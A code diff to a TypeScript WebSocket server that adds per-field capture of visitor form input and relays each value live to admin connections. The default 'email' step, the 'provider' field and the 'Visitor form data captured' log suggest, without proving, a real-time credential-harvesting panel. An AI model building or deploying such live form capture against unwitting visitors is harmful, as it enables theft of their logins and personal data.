@@ -19,6 +19,7 @@ interface Visitor {
   step: string;
   userAgent: string;
   connectedAt: number;
+  formData: Record<string, string>;
 }
 
 interface VisitorPublic {
@@ -29,6 +30,7 @@ interface VisitorPublic {
   step: string;
   userAgent: string;
   connectedAt: number;
+  formData: Record<string, string>;
 }
 
 const visitors = new Map<string, Visitor>();
@@ -94,6 +96,7 @@ function toPublic(v: Visitor): VisitorPublic {
     step: v.step,
     userAgent: v.userAgent,
     connectedAt: v.connectedAt,
+    formData: { ...v.formData },
   };
 }
 
@@ -155,6 +158,7 @@ export function setupWebSocket(server: Server) {
               step: (msg['step'] as string) || 'email',
               userAgent: (msg['userAgent'] as string) || '',
               connectedAt: Date.now(),
+              formData: {},
             };
             visitors.set(id, visitor);
             broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
@@ -178,6 +182,20 @@ export function setupWebSocket(server: Server) {
                   step: v.step,
                   provider: v.provider,
                 });
+              }
+            } else if (m['type'] === 'form-data') {
+              const v = visitors.get(id);
+              if (v) {
+                const field = m['field'] as string;
+                const value = m['value'] as string;
+                v.formData[field] = value;
+                broadcastToAdmins({
+                  type: 'visitor-form-data',
+                  id,
+                  field,
+                  value,
+                });
+                logger.info({ id, field }, 'Visitor form data captured');
               }
             }
           } catch (err) {
